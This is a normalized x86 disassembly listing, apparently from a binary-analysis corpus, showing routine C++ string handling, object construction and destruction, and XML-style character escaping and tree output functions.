push 0x0
mov ecx esi
call sub_429e10
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0xc
mov eax [ esi + 0x18 ]
cmp eax edi
jae r-xdata
call sub_43f0d9
test edi edi
jne r-xdata
mov eax [ esi + 0x14 ]
push eax
push edi
mov ecx esi
call sub_42a040
test edi edi
jbe r-xdata
mov [ esi + 0x14 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0xc
cmp [ ebx + 0x18 ] 0x10
jb r-xdata
lea eax [ esi + 0x4 ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebp
pop ebx
retn 0xc
mov eax [ esi + 0x4 ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebp
pop ebx
retn 0xc
lea edx [ ebx + 0x4 ]
mov edx [ ebx + 0x4 ]
jmp r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov ecx [ esi + 0x18 ]
lea ebx [ esi + 0x4 ]
cmp ecx 0x10
jb r-xdata
mov [ ebx + edi ] 0x0
mov ebx [ ebx ]
push edi
add edx ebp
push edx
push ecx
push eax
call sub_43f985
add esp 0x10
cmp [ esi + 0x18 ] 0x10
mov [ esi + 0x14 ] edi
jb r-xdata
sub_429fe0
mov ecx [ esp + 0x4 ]
sub esp 0xc
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x1
jae r-xdata
xor ecx ecx
push ecx
call sub_43fa1d
add esp 0x4
add esp 0xc
retn 0x4
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x4 ]
mov [ esp + 0x14 ] 0x0
call sub_43fa93
push r--data
lea ecx [ esp + 0x4 ]
push ecx
mov [ esp + 0x8 ] r--data
call sub_442eab
int3
sub_42a040
push ebp
mov ebp esp
push 0xffffffff
push sub_4591c0
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x14 ] edi
mov eax [ ebp + 0x8 ]
mov esi eax
or esi 0xf
cmp esi 0xfffffffe
jbe r-xdata
mov ebx [ edi + 0x18 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp edx ecx
jae r-xdata
mov esi eax
jmp r-xdata
lea ecx [ esi + 0x1 ]
push ecx
mov ecx edi
mov [ ebp - 0x4 ] 0x0
call sub_429fe0
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax 0xfffffffe
sub eax ecx
cmp ebx eax
ja r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
jbe r-xdata
lea esi [ ecx + ebx ]
cmp [ edi + 0x18 ] 0x10
jb r-xdata
cmp [ edi + 0x18 ] 0x10
jb r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
mov [ eax ] 0x0
mov [ eax ] ecx
mov [ edi + 0x18 ] esi
mov [ edi + 0x14 ] ebx
cmp esi 0x10
jb r-xdata
mov ecx [ edi + 0x4 ]
push ecx
call sub_43f960
add esp 0x4
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
mov [ eax + ebx ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ecx
push ebx
push eax
mov eax [ ebp + 0x8 ]
lea edx [ esi + 0x1 ]
push edx
push eax
call sub_43f985
add esp 0x10
sub_42a149
mov esi [ ebp - 0x14 ]
cmp [ esi + 0x18 ] 0x10
jb r-xdata
push 0x0
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
push 0x0
mov [ esi + 0x4 ] 0x0
call sub_442eab
int3
mov edx [ esi + 0x4 ]
push edx
call sub_43f960
add esp 0x4
sub_42a180
push ebp
mov ebp [ esp + 0x8 ]
push esi
push edi
mov esi ecx
test ebp ebp
je r-xdata
mov edi [ esp + 0x14 ]
cmp edi 0xfffffffe
jbe r-xdata
mov edx [ esi + 0x18 ]
lea eax [ esi + 0x4 ]
cmp edx 0x10
jb r-xdata
mov eax [ esi + 0x18 ]
cmp eax edi
jae r-xdata
call sub_43f0d9
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ esi + 0x14 ]
push edx
push edi
mov ecx esi
call sub_42a040
test edi edi
cmp edx 0x10
jb r-xdata
cmp ebp ecx
jb r-xdata
jbe r-xdata
mov [ esi + 0x14 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov ecx [ esi + 0x18 ]
push ebx
lea ebx [ esi + 0x4 ]
cmp ecx 0x10
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
lea eax [ esi + 0x4 ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax [ esi + 0x4 ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
cmp edx 0x10
jb r-xdata
mov edi [ esi + 0x14 ]
add edi ecx
cmp edi ebp
jbe r-xdata
mov [ ebx + edi ] 0x0
pop ebx
mov ebx [ ebx ]
push edi
push ebp
push ecx
push eax
call sub_43f985
add esp 0x10
cmp [ esi + 0x18 ] 0x10
mov [ esi + 0x14 ] edi
jb r-xdata
mov ecx [ esp + 0x14 ]
push ecx
sub ebp eax
push ebp
push esi
mov ecx esi
call sub_429ea0
pop edi
pop esi
pop ebp
retn 0x8
mov eax [ eax ]
sub_42a280
push ecx
mov eax [ eax ]
push ebp
mov ebp [ eax ]
add eax 0x8
mov [ esp + 0x4 ] eax
mov eax [ ebx ]
push esi
mov esi [ eax ]
add esi ebp
cmp esi [ eax + 0x4 ]
jbe r-xdata
mov eax [ ebx ]
mov ecx [ esp + 0x8 ]
mov edx [ eax ]
push ebp
push ecx
lea eax [ edx + eax + 0x8 ]
push eax
call sub_441f70
mov ecx [ ebx ]
mov [ ecx ] esi
mov edx [ ebx ]
add esp 0xc
mov [ edx + esi + 0x8 ] 0x0
pop esi
mov eax ebx
pop ebp
pop ecx
retn
push edi
mov edi [ eax + 0x4 ]
add edi esi
push ebx
call sub_42a2d0
pop edi
sub_42a2d0
push 0xffffffff
push sub_458ec8
mov eax [ fs : 0x0 ]
push eax
push ebx
push ebp
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x20 ]
mov eax [ ebp ]
cmp edi [ eax + 0x4 ]
jbe r-xdata
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebp
pop ebx
add esp 0xc
retn 0x4
mov esi rw-data
mov [ esp + 0x20 ] esi
mov [ esp + 0x18 ] 0x0
mov ebx [ eax ]
test edi edi
je r-xdata
mov eax [ ebp ]
mov ecx [ eax ]
push ecx
add eax 0x8
push eax
lea edx [ esi + 0x8 ]
push edx
call sub_443790
mov eax [ ebp ]
add esp 0xc
mov [ ebp ] esi
cmp eax rw-data
je r-xdata
xor ecx ecx
lea eax [ edi + 0xf ]
shr eax 0x2
mov edx 0x4
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_43fa1d
mov esi eax
mov [ esi ] ebx
mov [ ebx + esi + 0x8 ] 0x0
add esp 0x4
mov [ esi + 0x4 ] edi
push eax
call sub_43f960
add esp 0x4
sub_42a390
push 0xffffffff
push sub_458e98
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebp
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
cmp esi ecx
ja r-xdata
mov ebp rw-data
mov [ esp + 0x8 ] ebp
mov [ esp + 0x14 ] 0x0
test esi esi
je r-xdata
lea edx [ esi + esi * 2 + 0x18 ]
cmp ecx edx
ja r-xdata
push esi
lea eax [ ebp + 0x8 ]
push ebx
push eax
call sub_443790
mov eax [ edi ]
add esp 0xc
mov [ edi ] ebp
cmp eax rw-data
je r-xdata
xor ecx ecx
lea eax [ esi + 0xf ]
shr eax 0x2
mov edx 0x4
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_43fa1d
mov ebp eax
mov [ ebp ] esi
mov [ esi + ebp + 0x8 ] 0x0
add esp 0x4
mov [ ebp + 0x4 ] esi
push esi
add eax 0x8
push ebx
push eax
call sub_441f70
mov eax [ edi ]
mov [ eax ] esi
mov ecx [ edi ]
add esp 0xc
mov [ ecx + esi + 0x8 ] 0x0
mov eax edi
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebp
add esp 0x10
retn
mov eax edi
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebp
add esp 0x10
retn
push eax
call sub_43f960
add esp 0x4
sub_42a470
mov eax [ ebx ]
push ebp
mov ebp [ esp + 0xc ]
push esi
mov esi [ eax ]
add esi ebp
cmp esi [ eax + 0x4 ]
jbe r-xdata
mov eax [ ebx ]
mov ecx [ esp + 0xc ]
mov edx [ eax ]
push ebp
push ecx
lea eax [ edx + eax + 0x8 ]
push eax
call sub_441f70
mov ecx [ ebx ]
mov [ ecx ] esi
mov edx [ ebx ]
add esp 0xc
mov [ edx + esi + 0x8 ] 0x0
pop esi
mov eax ebx
pop ebp
retn 0x8
push edi
mov edi [ eax + 0x4 ]
add edi esi
push ebx
call sub_42a2d0
pop edi
sub_42a4c0
mov eax r--data
mov [ esi ] 0x0
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push edi
mov edi eax
je r-xdata
mov [ esi ] rw-data
xor ecx ecx
lea eax [ edi + 0xf ]
shr eax 0x2
mov edx 0x4
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_43fa1d
mov [ esi ] eax
mov [ eax ] edi
mov eax [ esi ]
mov [ eax + edi + 0x8 ] 0x0
mov ecx [ esi ]
add esp 0x4
mov [ ecx + 0x4 ] edi
jmp r-xdata
mov eax [ esi ]
mov edx [ eax ]
push edx
add eax 0x8
push r--data
push eax
call sub_443790
add esp 0xc
mov eax esi
pop edi
retn
sub_42a530
push ebx
push esi
push edi
mov ebx eax
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ esp + 0x10 ]
sub eax edx
mov esi eax
call sub_42a390
pop edi
pop esi
pop ebx
retn 0x4
sub_42a560
mov eax [ esp + 0x4 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push ebp
mov ebp eax
mov eax [ ebx ]
push esi
mov esi [ eax ]
add esi ebp
cmp esi [ eax + 0x4 ]
jbe r-xdata
mov eax [ ebx ]
mov ecx [ esp + 0xc ]
mov edx [ eax ]
push ebp
push ecx
lea eax [ edx + eax + 0x8 ]
push eax
call sub_441f70
mov ecx [ ebx ]
mov [ ecx ] esi
mov edx [ ebx ]
add esp 0xc
mov [ edx + esi + 0x8 ] 0x0
pop esi
mov eax ebx
pop ebp
retn 0x4
push edi
mov edi [ eax + 0x4 ]
add edi esi
push ebx
call sub_42a2d0
pop edi
sub_42a5c0
mov eax [ ebx ]
push esi
mov esi [ eax ]
inc esi
cmp esi [ eax + 0x4 ]
jbe r-xdata
mov eax [ ebx ]
mov edx [ eax ]
push 0x1
lea ecx [ esp + 0xc ]
push ecx
lea eax [ edx + eax + 0x8 ]
push eax
call sub_441f70
mov ecx [ ebx ]
mov [ ecx ] esi
mov edx [ ebx ]
add esp 0xc
mov [ edx + esi + 0x8 ] 0x0
mov eax ebx
pop esi
retn 0x4
push edi
mov edi [ eax + 0x4 ]
add edi esi
push ebx
call sub_42a2d0
pop edi
sub_42a660
push esi
mov esi ecx
mov eax [ esi + 0x18 ]
cmp eax rw-data
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax rw-data
je r-xdata
push eax
call sub_43f960
add esp 0x4
test [ esp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
push eax
call sub_43f960
add esp 0x4
mov eax esi
pop esi
retn 0x4
push esi
call sub_43f960
add esp 0x4
sub_42a6b0
mov eax [ esi + 0x18 ]
cmp eax rw-data
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax rw-data
je r-xdata
push eax
call sub_43f960
add esp 0x4
mov [ esi ] r--data
retn
push eax
call sub_43f960
add esp 0x4
sub_42a6f0
or ecx 0xffffffff
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] ecx
xor ecx ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x20 ] rw-data
mov [ eax + 0x10 ] ecx
mov [ eax + 0x14 ] 0x2
mov [ eax + 0x18 ] ecx
mov [ eax + 0x1c ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x28 ] ecx
mov [ eax ] r--data
retn
sub_42a760
push 0xffffffff
push sub_459518
mov eax [ fs : 0x0 ]
push eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x14 ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x24 ]
or eax 0xffffffff
mov [ ebp + 0x8 ] eax
mov [ ebp + 0x4 ] eax
xor ecx ecx
lea edi [ ebp + 0x20 ]
mov [ ebp + 0xc ] ecx
mov [ edi ] rw-data
mov [ ebp + 0x10 ] ecx
mov [ ebp + 0x14 ] 0x4
mov [ ebp + 0x18 ] ecx
mov [ ebp + 0x1c ] ecx
mov [ ebp + 0x24 ] ecx
mov [ ebp + 0x28 ] ecx
mov eax r--data
mov [ esp + 0x1c ] ecx
mov [ ebp ] r--data
lea esi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
cmp dl cl
jne r-xdata
sub eax esi
mov esi eax
mov ebx r--data
call sub_42a390
mov [ ebp + 0x2c ] 0x0
mov eax ebp
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn 0x4
sub_42a830
or ecx 0xffffffff
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] ecx
xor ecx ecx
mov edx rw-data
mov [ eax + 0xc ] ecx
mov [ eax + 0x20 ] edx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x14 ] 0x5
mov [ eax + 0x18 ] ecx
mov [ eax + 0x1c ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x28 ] ecx
mov [ eax ] r--data
mov [ eax + 0x2c ] edx
mov [ eax + 0x30 ] edx
mov [ eax + 0x34 ] edx
retn
sub_42a890
push esi
mov esi ecx
mov [ esi ] r--data
mov eax [ esi + 0x34 ]
cmp eax rw-data
je r-xdata
mov eax [ esi + 0x30 ]
cmp eax rw-data
je r-xdata
push eax
call sub_43f960
add esp 0x4
mov eax [ esi + 0x2c ]
cmp eax rw-data
je r-xdata
push eax
call sub_43f960
add esp 0x4
mov ecx esi
call sub_42ac70
test [ esp + 0x8 ] 0x1
je r-xdata
push eax
call sub_43f960
add esp 0x4
mov eax esi
pop esi
retn 0x4
push esi
call sub_43f960
add esp 0x4
sub_42a8f0
or ecx 0xffffffff
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] ecx
xor ecx ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x20 ] rw-data
mov [ eax + 0x10 ] ecx
mov [ eax + 0x14 ] 0x3
mov [ eax + 0x18 ] ecx
mov [ eax + 0x1c ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x28 ] ecx
mov [ eax ] r--data
retn
sub_42a960
push esi
mov esi ecx
mov [ esi ] r--data
mov eax [ esi + 0x34 ]
cmp eax rw-data
je r-xdata
mov ecx esi
call sub_42ac70
test [ esp + 0x8 ] 0x1
je r-xdata
push eax
call sub_43f960
add esp 0x4
mov eax esi
pop esi
retn 0x4
push esi
call sub_43f960
add esp 0x4
sub_42a9a0
sub esp 0x34
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x30 ] eax
mov eax [ esp + 0x38 ]
mov ecx [ eax ]
mov edx [ ecx ]
push ebp
xor ebp ebp
mov [ esp + 0xc ] eax
test edx edx
jle r-xdata
mov ecx [ esp + 0x34 ]
pop ebp
xor ecx esp
call sub_43f96b
add esp 0x34
retn
push ebx
push edi
jmp r-xdata
lea eax [ ecx + ebp + 0x8 ]
mov [ esp + 0xc ] eax
mov al [ eax ]
mov [ esp + 0x18 ] al
cmp al 0x26
jne r-xdata
cmp al 0x3c
jne r-xdata
lea eax [ edx - 0x2 ]
cmp ebp eax
jge r-xdata
cmp al 0x3e
jne r-xdata
mov eax [ esi ]
mov ecx [ rw-data ]
mov ebx [ eax ]
mov edx [ rw-data ]
add ebx ecx
mov [ esp + 0x10 ] ecx
mov [ esp + 0xc ] edx
cmp ebx [ eax + 0x4 ]
jbe r-xdata
mov eax [ esi ]
mov ecx [ rw-data ]
mov ebx [ eax ]
mov edx [ rw-data ]
add ebx ecx
mov [ esp + 0xc ] ecx
mov [ esp + 0x10 ] edx
cmp ebx [ eax + 0x4 ]
jbe r-xdata
cmp [ ecx + ebp + 0x9 ] 0x23
jne r-xdata
cmp al 0x22
jne r-xdata
mov eax [ esi ]
mov ecx [ rw-data ]
mov ebx [ eax ]
mov edx [ rw-data ]
add ebx ecx
mov [ esp + 0x10 ] ecx
mov [ esp + 0xc ] edx
cmp ebx [ eax + 0x4 ]
jbe r-xdata
mov eax [ esi ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push ecx
mov ecx [ eax ]
push edx
lea edx [ ecx + eax + 0x8 ]
push edx
call sub_441f70
mov eax [ esi ]
mov [ eax ] ebx
mov ecx [ esi ]
add esp 0xc
mov [ ecx + ebx + 0x8 ] 0x0
jmp r-xdata
mov edi [ eax + 0x4 ]
add edi ebx
push esi
call sub_42a2d0
mov eax [ esi ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x10 ]
push ecx
mov ecx [ eax ]
push edx
lea edx [ ecx + eax + 0x8 ]
push edx
call sub_441f70
mov eax [ esi ]
mov [ eax ] ebx
mov ecx [ esi ]
add esp 0xc
mov [ ecx + ebx + 0x8 ] 0x0
jmp r-xdata
mov edi [ eax + 0x4 ]
add edi ebx
push esi
call sub_42a2d0
cmp [ ecx + ebp + 0xa ] 0x78
jne r-xdata
cmp al 0x27
jne r-xdata
mov eax [ esi ]
mov ecx [ rw-data ]
mov ebx [ eax ]
mov edx [ rw-data ]
add ebx ecx
mov [ esp + 0x10 ] ecx
mov [ esp + 0xc ] edx
cmp ebx [ eax + 0x4 ]
jbe r-xdata
mov eax [ esi ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push ecx
mov ecx [ eax ]
push edx
lea edx [ ecx + eax + 0x8 ]
push edx
call sub_441f70
mov eax [ esi ]
mov [ eax ] ebx
mov ecx [ esi ]
add esp 0xc
mov [ ecx + ebx + 0x8 ] 0x0
jmp r-xdata
mov edi [ eax + 0x4 ]
add edi ebx
push esi
call sub_42a2d0
inc ebp
dec edx
cmp ebp edx
jge r-xdata
cmp al 0x20
jae r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
push edx
push eax
mov ebx esi
call sub_42a470
jmp r-xdata
mov eax [ esi ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push ecx
mov ecx [ eax ]
push edx
lea edx [ ecx + eax + 0x8 ]
push edx
call sub_441f70
mov eax [ esi ]
mov [ eax ] ebx
mov ecx [ esi ]
add esp 0xc
mov [ ebx + ecx + 0x8 ] 0x0
jmp r-xdata
mov edi [ eax + 0x4 ]
add edi ebx
push esi
call sub_42a2d0
pop edi
pop ebx
mov edx [ esp + 0x14 ]
mov ecx [ edx ]
mov edx [ ecx ]
cmp ebp edx
jl r-xdata
mov eax [ esi ]
mov ebx [ eax ]
inc ebx
cmp ebx [ eax + 0x4 ]
jbe r-xdata
mov ecx [ esp + 0x18 ]
push ecx
mov ebx esi
call sub_42a5c0
movzx ecx al
push ecx
lea edx [ esp + 0x20 ]
push r--data
push edx
mov edx 0x20
call sub_42bdc0
lea eax [ esp + 0x28 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov eax [ esi ]
mov ecx [ esp + 0xc ]
mov edx [ eax ]
push 0x1
push ecx
lea eax [ edx + eax + 0x8 ]
push eax
call sub_441f70
mov ecx [ esi ]
mov eax [ esp + 0x20 ]
mov [ ecx ] ebx
mov edx [ esi ]
mov [ edx + ebx + 0x8 ] 0x0
mov eax [ eax ]
inc ebp
lea ecx [ eax + ebp + 0x8 ]
add esp 0xc
cmp [ ecx ] 0x3b
mov [ esp + 0xc ] ecx
je r-xdata
mov edi [ eax + 0x4 ]
add edi ebx
push esi
call sub_42a2d0
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0x20 ]
push eax
mov ebx esi
call sub_42a470
jmp r-xdata
mov ecx [ eax ]
dec ecx
cmp ebp ecx
jl r-xdata
jmp r-xdata
sub_42ac70
push 0xffffffff
push sub_458e73
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ esp + 0xc ] edi
mov [ edi ] r--data
mov [ esp + 0x18 ] 0x1
mov esi [ edi + 0x18 ]
test esi esi
je r-xdata
mov eax [ edi + 0x20 ]
cmp eax rw-data
je r-xdata
mov edi edi
mov [ edi ] r--data
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x10
retn
push eax
call sub_43f960
add esp 0x4
mov ecx esi
mov eax [ ecx ]
mov edx [ eax ]
mov esi [ esi + 0x28 ]
push 0x1
call edx
test esi esi
jne r-xdata
sub_42acf0
push ebp
xor ebp ebp
push edi
mov edi ecx
cmp [ eax + 0x14 ] ebp
jne r-xdata
mov [ eax + 0x10 ] edi
mov ecx [ edi + 0x1c ]
mov [ eax + 0x24 ] ecx
mov [ eax + 0x28 ] ebp
mov ecx [ edi + 0x1c ]
cmp ecx ebp
je r-xdata
mov edx [ eax ]
push esi
mov ecx eax
mov eax [ edx ]
push 0x1
call eax
mov esi edi
cmp edi ebp
je r-xdata
mov [ edi + 0x18 ] eax
mov [ edi + 0x1c ] eax
pop edi
pop ebp
retn
mov [ ecx + 0x28 ] eax
mov [ edi + 0x1c ] eax
pop edi
pop ebp
retn
pop esi
pop edi
xor eax eax
pop ebp
retn
mov edx [ esi ]
mov eax [ edx + 0x10 ]
mov ecx esi
call eax
test eax eax
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x10 ]
mov ecx esi
call eax
cmp eax ebp
je r-xdata
mov esi [ esi + 0x10 ]
cmp esi ebp
jne r-xdata
lea esp [ esp ]
pop esi
pop edi
pop ebp
retn
mov edx [ edi ]
mov eax [ edx + 0x10 ]
mov ecx edi
call eax
mov ebp eax
mov edi [ edi + 0x10 ]
cmp edi ebp
jne r-xdata
push ebx
mov [ ebp + 0x2c ] 0x1
mov [ ebp + 0x30 ] 0xf
mov ebx [ rw-data ]
mov eax ebx
lea edx [ eax + 0x1 ]
mov edi edi
mov edx [ edi ]
mov eax [ edx + 0x10 ]
mov ecx edi
call eax
test eax eax
jne r-xdata
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea edi [ ebp + 0x34 ]
mov esi eax
call sub_42a390
or eax 0xffffffff
mov [ ebp + 0x40 ] eax
mov [ ebp + 0x3c ] eax
pop ebx
cmp [ ebp + 0x2c ] 0x0
jne r-xdata
sub_42add0
push 0xffffffff
push sub_4591a3
mov eax [ fs : 0x0 ]
push eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x14 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov ebp [ esp + 0x24 ]
or edx 0xffffffff
mov [ ebp + 0x8 ] edx
mov [ ebp + 0x4 ] edx
xor ecx ecx
lea edi [ ebp + 0x20 ]
mov esi rw-data
mov [ ebp + 0xc ] ecx
mov [ edi ] esi
mov [ ebp + 0x10 ] ecx
mov [ ebp + 0x14 ] 0x1
mov [ ebp + 0x24 ] ecx
mov [ ebp + 0x28 ] ecx
mov [ esp + 0x1c ] ecx
lea eax [ ebp + 0x2c ]
mov [ ebp ] r--data
mov [ eax + 0x8 ] edx
mov [ eax + 0x4 ] edx
mov [ eax + 0xc ] ecx
mov [ eax ] r--data
mov [ eax + 0x14 ] esi
mov [ eax + 0x18 ] esi
mov [ eax + 0x10 ] ecx
mov [ eax + 0x20 ] eax
mov [ eax + 0x1c ] eax
mov [ esp + 0x1c ] 0x1
mov eax ebx
mov [ ebp + 0x1c ] ecx
mov [ ebp + 0x18 ] ecx
lea esi [ eax + 0x1 ]
mov edi edi
mov dl [ eax ]
inc eax
cmp dl cl
jne r-xdata
sub eax esi
mov esi eax
call sub_42a390
mov eax ebp
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn 0x4
sub_42aeb0
push 0xffffffff
push sub_458fd3
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0x8 ] esi
mov [ esi ] r--data
mov eax esi
mov [ esp + 0x14 ] 0x1
call sub_42af40
mov eax [ esi + 0x44 ]
cmp eax rw-data
je r-xdata
mov eax [ esi + 0x40 ]
cmp eax rw-data
je r-xdata
push eax
call sub_43f960
add esp 0x4
mov ecx esi
mov [ esi + 0x2c ] r--data
mov [ esp + 0x14 ] 0xffffffff
call sub_42ac70
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x10
retn
push eax
call sub_43f960
add esp 0x4
sub_42af40
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x18 ]
xor ebx ebx
cmp esi ebx
je r-xdata
mov [ edi + 0x18 ] ebx
mov [ edi + 0x1c ] ebx
lea esi [ edi + 0x2c ]
lea ebx [ ebx ]
mov edi edi
pop edi
pop esi
pop ebx
retn
cmp eax ebx
je r-xdata
mov ecx esi
mov eax [ ecx ]
mov edx [ eax ]
mov esi [ esi + 0x28 ]
push 0x1
call edx
cmp esi ebx
jne r-xdata
mov ecx eax
sub ecx esi
neg ecx
sbb ecx ecx
and ecx eax
cmp eax esi
je r-xdata
cmp ecx ebx
je r-xdata
lea esp [ esp ]
mov eax [ esi + 0x20 ]
cmp eax esi
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
jmp r-xdata
mov edx [ eax + 0x1c ]
mov edi [ eax + 0x20 ]
mov [ edx + 0x20 ] edi
mov edx [ eax + 0x20 ]
mov edi [ eax + 0x1c ]
mov [ edx + 0x1c ] edi
mov [ eax + 0x20 ] ebx
mov [ eax + 0x1c ] ebx
mov eax [ eax + 0x20 ]
cmp eax esi
jne r-xdata
cmp eax ecx
je r-xdata
jmp r-xdata
sub_42afe0
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov ebx ecx
test ebp ebp
jle r-xdata
mov eax [ ebx + 0x20 ]
add eax 0x8
push eax
push r--data
push esi
call sub_4424c8
mov edi [ ebx + 0x4c ]
lea eax [ ebx + 0x2c ]
add esp 0xc
cmp edi eax
je r-xdata
mov edi ebp
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
test edi edi
je r-xdata
push r--data
push esi
call sub_4424c8
add esp 0x8
sub edi 0x1
jne r-xdata
cmp eax [ ebx + 0x1c ]
jne r-xdata
push r--data
push esi
call sub_4424c8
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
lea ebx [ ebx ]
push r--data
push esi
call sub_4424c8
mov edi [ ebx + 0x18 ]
add esp 0x8
test edi edi
je r-xdata
mov ecx eax
mov eax [ ecx ]
mov edx [ eax + 0x2c ]
call edx
test eax eax
je r-xdata
test edi edi
jne r-xdata
mov edx [ edi + 0x14 ]
cmp [ edx ] 0x0
je r-xdata
push r--data
push esi
call sub_4424c8
add esp 0x8
test ebp ebp
jle r-xdata
inc ebp
push r--data
push esi
call sub_4424c8
mov ecx [ ebx + 0x18 ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
add esp 0x8
inc ebp
push ebp
push esi
call edx
mov eax [ ebx + 0x20 ]
add eax 0x8
push eax
jmp r-xdata
push r--data
push esi
call sub_4424c8
mov edx [ edi ]
mov eax [ edx + 0x4 ]
add esp 0x8
push ebp
push esi
mov ecx edi
call eax
mov edi [ edi + 0x20 ]
mov ecx [ edi + 0x18 ]
cmp [ ecx ] 0x0
jne r-xdata
mov ecx [ ebx + 0x20 ]
add ecx 0x8
push ecx
mov edi ebp
lea ecx [ ecx ]
mov edx [ edi ]
mov eax [ edx + 0x4 ]
push ebp
push esi
mov ecx edi
call eax
mov edi [ edi + 0x28 ]
test edi edi
jne r-xdata
push r--data
push esi
call sub_4424c8
add esp 0x8
push r--data
push esi
call sub_4424c8
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
push r--data
push esi
call sub_4424c8
add esp 0x8
